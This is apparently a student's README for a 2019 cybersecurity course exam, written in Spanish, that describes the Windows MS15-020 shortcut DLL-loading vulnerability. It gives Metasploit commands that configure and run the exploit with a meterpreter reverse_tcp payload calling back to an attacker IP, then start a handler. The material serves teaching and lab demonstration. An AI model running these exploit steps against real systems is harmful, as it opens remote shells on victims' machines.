# ciberseguridad-2019-1
Repositorio para Ciberseguridad 2019-I
Parcial Ciberseguridad 2019-1 

Juan Esteban Monsalve Echeverry

Vulnerabilidad
--------------

MS15-020: Una vulnerabilidad en Windows podría permitir la ejecución remota de código 

Las vulnerabilidades podrían permitir la ejecución remota de código si un atacante correctamente convence a un usuario visita un sitio web especialmente diseñado, abra un archivo especialmente diseñado o abrir un archivo en un directorio de trabajo que contiene un archivo DLL especialmente diseñado. 
Publicado: marzo 10, 2015

Sistema Operativo
-----------------
Windows XP, Windows 7 

Software 
Sistema opertativo: Kali Linux 
Herramienta: 
Metaexploit 

-----------------------------------------------------------------------------------------------------------
Instructivo 
-----------

msf > use exploit/windows/fileformat/ms15_020_shortcut_icon_dllloader 

msf exploit(ms15_020_shortcut_icon_dllloader) > set payload windows/meterpreter/reverse_tcp 
payload => windows/meterpreter/reverse_tcp 

msf exploit(ms15_020_shortcut_icon_dllloader) > set lhost 10.191.5.5

lhost=> 10.191.5.5

msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCHOST 10.191.5.6

UNCHOST => 10.191.5.6

msf exploit(ms15_020_shortcut_icon_dllloader) > set UNCSHARE share

UNCSHARE => share 

msf exploit(ms15_020_shortcut_icon_dllloader) > exploit

----------------------------------------------------------------------------------------------------------
use exploit/multi/handler 

set payload windows/meterpreter/reverser_tcp 

set lhost 10.191.5.5

----------------------------------------------------------------------------------------------------------
Video Demo
----------

https://youtu.be/oq0XCedmUwI

----------------------------------------------------------------------------------------------------------

Referencias
-----------

http://da1sy.cn/2018/05/MS15-020/
https://github.com/rapid7/metasploit-framework/pull/4911
https://www.rapid7.com/db/vulnerabilities/WINDOWS-HOTFIX-MS15-020
https://www.rapid7.com/db/modules/exploit/windows/fileformat/ms15_020_shortcut_icon_dllloader 
